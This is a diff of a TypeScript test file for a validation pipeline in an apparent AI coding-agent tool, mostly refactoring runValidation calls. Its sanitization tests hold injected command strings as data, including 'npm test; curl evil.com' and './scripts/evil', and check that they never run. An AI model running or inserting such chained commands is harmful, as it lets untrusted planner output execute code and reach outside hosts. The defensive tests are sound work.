@@ -3,6 +3,7 @@ import { writeFileSync, mkdirSync } from 'node:fs';
 import { join } from 'node:path';
 import { createValidator, formatValidationError } from './validation.js';
 import type { ValidationCommandRunner } from './validation.js';
+import { findAffectedTestFile } from '../../core/validation/test-discovery.js';
 import type { ValidationResult } from './validation-types.js';
 import { createTempDir, cleanupTempDir } from '#testing/helpers/temp-dir.js';
 import type { Config } from '../../core/schemas/config.js';
@@ -10,6 +11,7 @@ import type { Task } from '../../core/schemas/task.js';
 import { makeTask } from '#testing/helpers/factories/task.js';
 import type { DiscoveredValidation } from '../../core/schemas/workflow.js';
 import { createDefaultConfig } from '../../core/config/load/load.js';
+import { processError } from '../../lib/process/errors.js';
 
 function makeConfig(overrides: Partial<Config['validation']>): Config {
   const base = createDefaultConfig();
@@ -53,19 +55,21 @@ describe('findAffectedTestFile', () => {
     tempDir = createTempDir('validator-test');
     mkdirSync(join(tempDir, 'tests'), { recursive: true });
     writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
-    expect(createValidator().findAffectedTestFile('src/foo.ts', tempDir)).toBe(join(tempDir, 'tests', 'foo.test.ts'));
+    expect(findAffectedTestFile('src/foo.ts', tempDir)).toBe(join(tempDir, 'tests', 'foo.test.ts'));
   });
 
   it('maps src/utils/bar.ts to tests/utils/bar.test.ts when test file exists', () => {
     tempDir = createTempDir('validator-test');
     mkdirSync(join(tempDir, 'tests', 'utils'), { recursive: true });
     writeFileSync(join(tempDir, 'tests', 'utils', 'bar.test.ts'), '');
-    expect(createValidator().findAffectedTestFile('src/utils/bar.ts', tempDir)).toBe(join(tempDir, 'tests', 'utils', 'bar.test.ts'));
+    expect(findAffectedTestFile('src/utils/bar.ts', tempDir)).toBe(
+      join(tempDir, 'tests', 'utils', 'bar.test.ts'),
+    );
   });
 
   it('returns null when no matching test file found', () => {
     tempDir = createTempDir('validator-test');
-    expect(createValidator().findAffectedTestFile('src/missing.ts', tempDir)).toBe(null);
+    expect(findAffectedTestFile('src/missing.ts', tempDir)).toBe(null);
   });
 });
 
@@ -95,9 +99,7 @@ describe('formatValidationError', () => {
 
   it('truncates error to 20 lines', () => {
     const longError = Array.from({ length: 30 }, (_, i) => `Error line ${i + 1}`).join('\n');
-    const results: ValidationResult[] = [
-      { passed: false, stage: 'typecheck', error: longError },
-    ];
+    const results: ValidationResult[] = [{ passed: false, stage: 'typecheck', error: longError }];
     const error = formatValidationError(results);
     expect(error).not.toContain('Error line 21');
     expect(error).toContain('Error line 20');
@@ -124,14 +126,31 @@ describe('validation pipeline', () => {
   const fakeBus = { publish: () => {}, subscribe: () => () => {}, unsubscribeAll: () => {} };
 
   it('skips typecheck when master switch is off', async () => {
-    const config = makeConfig({ typecheck: false, typecheckCommand: 'cargo check', lint: false, test: false });
-    const results = await validator.runValidation(mkTask('src/main.rs'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const config = makeConfig({
+      typecheck: false,
+      typecheckCommand: 'cargo check',
+      lint: false,
+      test: false,
+    });
+    const results = await validator.runValidation({
+      task: mkTask('src/main.rs'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
     expect(results).toHaveLength(0);
   });
 
   it('skips lint when master switch is off', async () => {
     const config = makeConfig({ lint: false, lintCommand: 'cargo clippy' });
-    const results = await validator.runValidation(mkTask('src/main.rs'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/main.rs'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
     const lintResult = results.find((r) => r.stage === 'lint');
     expect(lintResult).toBeUndefined();
   });
@@ -140,7 +159,13 @@ describe('validation pipeline', () => {
     const config = makeConfig({ test: false });
     mkdirSync(join(tempDir, 'tests'), { recursive: true });
     writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
-    const results = await validator.runValidation(mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/foo.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
     const testResult = results.find((r) => r.stage === 'test');
     expect(testResult).toBeUndefined();
   });
@@ -169,7 +194,14 @@ describe('layer priority', () => {
     const config = makeConfig({ typecheckCommand: 'mypy src/', lint: false, test: false });
     const discovered: DiscoveredValidation = { typecheckCommand: 'cargo check' };
 
-    const results = await validator.runValidation(mkTask('src/main.py'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered);
+    const results = await validator.runValidation({
+      task: mkTask('src/main.py'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+      discoveredValidation: discovered,
+    });
 
     expect(results.find((r) => r.stage === 'typecheck')?.output).toBe('mypy src/');
     expectCommandRanInProject(runner, tempDir);
@@ -182,7 +214,14 @@ describe('layer priority', () => {
     const discovered: DiscoveredValidation = { typecheckCommand: 'cargo check' };
     writeFileSync(join(tempDir, 'go.mod'), 'module example.com/test');
 
-    const results = await validator.runValidation(mkTask('src/main.rs'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered);
+    const results = await validator.runValidation({
+      task: mkTask('src/main.rs'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+      discoveredValidation: discovered,
+    });
 
     expect(results.find((r) => r.stage === 'typecheck')?.output).toBe('cargo check');
     expectCommandRanInProject(runner, tempDir);
@@ -194,7 +233,13 @@ describe('layer priority', () => {
     const config = makeConfig({ lint: false, test: false });
     writeFileSync(join(tempDir, 'Cargo.toml'), '[package]\nname = "test"');
 
-    const results = await validator.runValidation(mkTask('src/main.rs'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/main.rs'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     expect(results.find((r) => r.stage === 'typecheck')?.output).toBe('cargo check');
     expectCommandRanInProject(runner, tempDir);
@@ -204,7 +249,13 @@ describe('layer priority', () => {
     const validator = createValidator({ runCommand: makeCommandRunner() });
     const config = makeConfig({ typecheck: false, lint: true, test: false });
 
-    const results = await validator.runValidation(mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/foo.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     const lintResult = results.find((r) => r.stage === 'lint');
     expect(lintResult).toBeUndefined();
@@ -217,7 +268,13 @@ describe('layer priority', () => {
     const config = makeConfig({ lint: false, test: false });
     writeFileSync(join(tempDir, 'Cargo.toml'), '[package]\nname = "test"');
 
-    const results = await validator.runValidation(mkTask('src/main.rs'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/main.rs'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     const tc = results.find((r) => r.stage === 'typecheck');
     expect(tc?.passed).toBe(true);
@@ -230,7 +287,13 @@ describe('layer priority', () => {
     const config = makeConfig({ lint: false, test: false });
     writeFileSync(join(tempDir, 'package.json'), '{"devDependencies":{"typescript":"^5"}}');
 
-    const results = await validator.runValidation(mkTask('src/app.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/app.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     expect(results.find((r) => r.stage === 'typecheck')?.output).toBe('npx tsc --noEmit');
     expectCommandRanInProject(runner, tempDir);
@@ -239,7 +302,7 @@ describe('layer priority', () => {
   it('short-circuits on typecheck failure without running lint or test', async () => {
     const validator = createValidator({
       runCommand: makeCommandRunner(
-        { stdout: '', stderr: 'type error', code: 1 },
+        processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' }),
         { stdout: 'lint should not run', stderr: '', code: 0 },
       ),
     });
@@ -247,7 +310,13 @@ describe('layer priority', () => {
     const config = makeConfig({ typecheck: true, lint: true, test: true });
     writeFileSync(join(tempDir, 'package.json'), '{"devDependencies":{"typescript":"^5"}}');
 
-    const results = await validator.runValidation(mkTask('src/app.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/app.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     expect(results).toHaveLength(1);
     const tc = results.find((r) => r.stage === 'typecheck');
@@ -257,10 +326,21 @@ describe('layer priority', () => {
 
   it('skips test stage when default source but no test file found', async () => {
     const validator = createValidator({ runCommand: makeCommandRunner() });
-    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const config = makeConfig({
+      typecheck: false,
+      lint: false,
+      test: true,
+      testCommand: undefined,
+    });
     writeFileSync(join(tempDir, 'package.json'), '{"devDependencies":{"typescript":"^5"}}');
 
-    const results = await validator.runValidation(mkTask('src/app.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id']);
+    const results = await validator.runValidation({
+      task: mkTask('src/app.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+    });
 
     expect(results.find((r) => r.stage === 'test')).toBeUndefined();
   });
@@ -286,37 +366,57 @@ describe('discovered validation sanitization', () => {
   it('does NOT execute planner-discovered ./evil-script', async () => {
     const runner = makeCommandRunner();
     const validator = createValidator({ runCommand: runner });
-    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const config = makeConfig({
+      typecheck: false,
+      lint: false,
+      test: true,
+      testCommand: undefined,
+    });
     const discovered: DiscoveredValidation = { testCommand: './scripts/evil' };
 
     mkdirSync(join(tempDir, 'tests'), { recursive: true });
     writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
 
-    const results = await validator.runValidation(
-      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
-    );
+    const results = await validator.runValidation({
+      task: mkTask('src/foo.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+      discoveredValidation: discovered,
+    });
 
     for (const call of runner.calls) {
       expect(call.cmd).not.toContain('evil');
       expect(call.args.join(' ')).not.toContain('evil');
     }
     if (results.length > 0) {
-      expect(results.find(r => r.stage === 'test')?.output).not.toContain('evil');
+      expect(results.find((r) => r.stage === 'test')?.output).not.toContain('evil');
     }
   });
 
   it('does NOT execute planner-discovered commands with shell operators', async () => {
     const runner = makeCommandRunner();
     const validator = createValidator({ runCommand: runner });
-    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const config = makeConfig({
+      typecheck: false,
+      lint: false,
+      test: true,
+      testCommand: undefined,
+    });
     const discovered: DiscoveredValidation = { testCommand: 'npm test; curl evil.com' };
 
     mkdirSync(join(tempDir, 'tests'), { recursive: true });
     writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
 
-    await validator.runValidation(
-      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
-    );
+    await validator.runValidation({
+      task: mkTask('src/foo.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+      discoveredValidation: discovered,
+    });
 
     for (const call of runner.calls) {
       expect(call.cmd).not.toContain('curl');
@@ -327,12 +427,22 @@ describe('discovered validation sanitization', () => {
   it('executes safe planner-discovered commands normally', async () => {
     const runner = makeCommandRunner();
     const validator = createValidator({ runCommand: runner });
-    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const config = makeConfig({
+      typecheck: false,
+      lint: false,
+      test: true,
+      testCommand: undefined,
+    });
     const discovered: DiscoveredValidation = { testCommand: 'npx vitest run' };
 
-    await validator.runValidation(
-      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
-    );
+    await validator.runValidation({
+      task: mkTask('src/foo.ts'),
+      projectDir: tempDir,
+      config,
+      bus: fakeBus,
+      phase: 'implementing',
+      discoveredValidation: discovered,
+    });
 
     expect(runner.calls.length).toBeGreaterThan(0);
     expect(runner.calls[0]?.cmd).toBe('npx');
@@ -353,22 +463,40 @@ describe('formatValidationError edge cases', () => {
 
 describe('validation output redaction', () => {
   let tempDir: string;
-  beforeEach(() => { tempDir = createTempDir('validator-redact'); });
-  afterEach(() => { cleanupTempDir(tempDir); });
+  beforeEach(() => {
+    tempDir = createTempDir('validator-redact');
+  });
+  afterEach(() => {
+    cleanupTempDir(tempDir);
+  });
 
   it('redacts API keys from validation error output before publishing', async () => {
     const secret = 'sk-ant-api03-TEST123456789012345678';
-    const runner = makeCommandRunner({ stdout: `Error: ${secret}`, stderr: `FAIL: key=${secret}`, code: 1 });
+    const runner = makeCommandRunner(
+      processError.exitCode({
+        command: 'tsc',
+        code: 1,
+        stderr: `FAIL: key=${secret}`,
+        output: `Error: ${secret}`,
+      }),
+    );
     const validator = createValidator({ runCommand: runner });
     const config = makeConfig({ typecheck: true, lint: false, test: false });
     const events: Array<Record<string, unknown>> = [];
-    const bus = { publish: (e: Record<string, unknown>) => events.push(e), subscribe: () => () => {} };
+    const bus = {
+      publish: (e: Record<string, unknown>) => events.push(e),
+      subscribe: () => () => {},
+    };
 
-    await validator.runValidation(
-      makeTask({ file: 'src/a.ts' }), tempDir, config, bus as never, 'implementing', 't1' as Task['id'],
-    );
+    await validator.runValidation({
+      task: makeTask({ file: 'src/a.ts' }),
+      projectDir: tempDir,
+      config,
+      bus: bus as never,
+      phase: 'implementing',
+    });
 
-    const validateEvent = events.find(e => e.type === 'validate' && e.status === 'done');
+    const validateEvent = events.find((e) => e.type === 'validate' && e.status === 'done');
     expect(validateEvent).toBeDefined();
     expect(String(validateEvent?.error ?? '')).not.toContain('TEST123456789012345678');
     expect(String(validateEvent?.error ?? '')).toContain('REDACTED');
@@ -381,9 +509,13 @@ describe('validation output redaction', () => {
     const config = makeConfig({ typecheck: true, lint: false, test: false });
     const bus = { publish: () => {}, subscribe: () => () => {} };
 
-    const results = await validator.runValidation(
-      makeTask({ file: 'src/a.ts' }), tempDir, config, bus as never, 'implementing', 't1' as Task['id'],
-    );
+    const results = await validator.runValidation({
+      task: makeTask({ file: 'src/a.ts' }),
+      projectDir: tempDir,
+      config,
+      bus: bus as never,
+      phase: 'implementing',
+    });
 
     expect(results[0]?.output?.length).toBeLessThanOrEqual(4097);
   });
